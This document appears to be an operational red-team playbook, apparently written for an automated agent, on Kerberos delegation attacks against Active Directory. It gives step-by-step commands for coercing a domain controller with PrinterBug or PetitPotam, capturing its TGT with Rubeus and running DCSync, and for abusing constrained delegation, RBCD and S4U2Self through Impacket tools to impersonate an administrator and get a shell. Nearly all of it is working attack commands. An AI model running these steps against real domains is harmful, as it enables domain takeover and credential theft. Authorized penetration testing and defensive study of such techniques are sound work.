# Kerberos Delegation Attacks + RBCD

**MITRE:** T1558, T1134.005 | **When:** AD confirmed + delegation flags in BloodHound.

## Unconstrained Delegation (T1558)

```bash
# Find unconstrained delegation accounts:
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,ServicePrincipalName

# Remote:
findDelegation.py corp.local/normaluser:'Password!' -dc-ip <DC_IP>
# Look for: "No Constraints" in Delegation Type column

# Exploit: Coerce DC to authenticate to compromised host with unconstrained delegation
# When DC authenticates -> DC's TGT cached on compromised host -> DCSync

# Step 1: Set up SpoolSample/Rubeus monitor on compromised host
Rubeus.exe monitor /interval:5 /nowrap

# Step 2: Coerce DC via PrinterBug or PetitPotam:
python3 printerbug.py corp.local/normaluser:'Password!'@<DC_IP> <COMPROMISED_HOST>
# OR: PetitPotam.py <COMPROMISED_HOST> <DC_IP>

# Step 3: Rubeus captures DC TGT -> use for DCSync
Rubeus.exe ptt /ticket:<BASE64_TICKET>
secretsdump.py -k -no-pass corp.local/dc$@<DC_IP>
```

## Constrained Delegation (S4U2Proxy)

```bash
# Find constrained delegation accounts:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Exploit with S4U2Self + S4U2Proxy:
getST.py -spn cifs/<TARGET_SERVER> corp.local/svc_constrained:'Password!' \
  -impersonate administrator -dc-ip <DC_IP>
# Output: administrator.ccache

export KRB5CCNAME=administrator.ccache
smbclient.py -k -no-pass corp.local/administrator@<TARGET_SERVER>
```

## Resource-Based Constrained Delegation (RBCD) - T1134.005

```bash
# Requirements: WriteProperty on a machine account (or ability to create machine accounts)
# Step 1: Create fake machine account (or use existing low-priv machine account):
addcomputer.py -computer-name 'FakePC$' -computer-pass 'Password123!' \
  corp.local/normaluser:'Password!' -dc-ip <DC_IP>

# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target:
rbcd.py -delegate-to <TARGET_MACHINE>$ -delegate-from 'FakePC$' \
  -action write corp.local/normaluser:'Password!' -dc-ip <DC_IP>

# Step 3: S4U abuse - get TGS for administrator on target:
getST.py -spn cifs/<TARGET_MACHINE> -impersonate administrator \
  corp.local/'FakePC$':'Password123!' -dc-ip <DC_IP>

# Step 4: Use ticket:
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass corp.local/administrator@<TARGET_MACHINE>
```

## S4U2Self Abuse (Protocol Transition)

```bash
# If service has TrustedToAuthForDelegation:
getST.py -spn cifs/<TARGET> -impersonate administrator \
  -self corp.local/svc_s4u:'Password!' -dc-ip <DC_IP>
```

**Evidence:** ccache ticket for administrator on target + shell confirmed.

**Signal:** `emit_signal VULN_CONFIRMED "RBCD/Delegation -> admin shell on <host>" "main/redteam" 0.95`
